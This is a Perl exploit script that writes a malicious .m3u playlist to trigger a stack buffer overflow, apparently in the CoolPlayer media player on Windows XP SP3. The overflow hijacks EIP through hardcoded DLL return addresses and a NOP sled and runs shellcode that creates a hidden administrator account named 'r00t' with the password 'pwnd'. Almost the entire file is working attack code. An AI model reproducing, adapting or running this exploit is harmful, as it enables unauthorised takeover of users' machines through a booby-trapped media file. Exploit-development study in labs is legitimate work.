#!/usr/bin/perl

my $buffsize = 10000; # set consistent buffer size

my $junk = "\x4A" x 260; # simulate unusable address containing junk with 'J'
# my $eip = "\x42" x 4;
my $eip = pack('V',0x7E4293F0); # EIP overwrite with pop-pop-pop-ret from shell32.dll
my $junk2 = "\x4A" x 12; # simulate unusable address containing junk with 'J'
my $usable_address = pack('V',0x7C86467B); # jmp esp kernel32.dll
my $nops = "\x90" x 20;

# my $shell = "\xcc" x 500; # simulate shellcode with INT

# XP SP3 add admin user shellcode -- 107 bytes
# mod'd from original by Anastasios Monachos http://www.exploit-db.com/exploits/15202/
my $shell = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23" .
"\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca" .
"\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63" .
"\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20" .
"\x6e\x65\x74\x20\x75\x73\x65\x72\x20" .
"\x72\x30\x30\x74\x20" . # user: r00t
"\x70\x77\x6e\x64" . # pass: pwnd
"\x20\x2f\x61\x64\x64\x20\x26\x26\x20\x6e" .
"\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72" .
"\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69" .
"\x73\x74\x72\x61\x74\x6f\x72\x73\x20".
"\x72\x30\x30\x74" .
"\x20\x2f\x61\x64\x64\x00";

my $sploit = $jmp.$junk.$eip.$junk2.$usable_address.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer
my $buffer = $sploit.$fill; # build final buffer

# Write Exploit Buffer to File
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";
